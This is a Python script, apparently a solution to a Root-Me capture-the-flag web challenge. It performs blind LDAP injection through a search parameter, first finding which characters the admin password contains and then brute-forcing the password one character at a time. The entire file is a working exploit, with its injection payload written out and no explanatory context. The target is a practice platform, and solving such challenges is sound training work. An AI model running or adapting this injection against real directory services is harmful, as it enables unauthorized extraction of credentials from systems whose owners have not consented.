import requests

page = "http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search="
charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^|/"
#charset = "0123456789abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+|/"
char_i = ""
passwd = ""
continuer = True

i = 0
j = 0
l = 0
print("*"*20)
while continuer:
  while i < len(charset):
    req = "ad*)(password=*" + charset[i] + "*))%00"
    res = requests.post(page+req)
    if res.text.find("sn : admin") != -1:
      char_i += charset[i]
      print("new charset : ", char_i)
      i += 1
    else:
      print("Error....", charset[i])
      i += 1
      if i == len(charset):
         continuer = False
print("*" * 20)
print("*" * 4 + "new charset : ", char_i)
continuer = True
while continuer:
  for j in char_i:
    brut = passwd + j
    req = "ad*)(password=" + brut + "*))%00"
    res = requests.post(page+req)
    if "1 results" in res.text:
      passwd += j
      print("pass : ", passwd)
      l = 0
      break
    else:
      print("loading....", passwd + j)
      if l == len(char_i):
         continuer = False
      l += 1


print("*"*20)
print("you password", passwd)


# ad*)(password=*a*))%00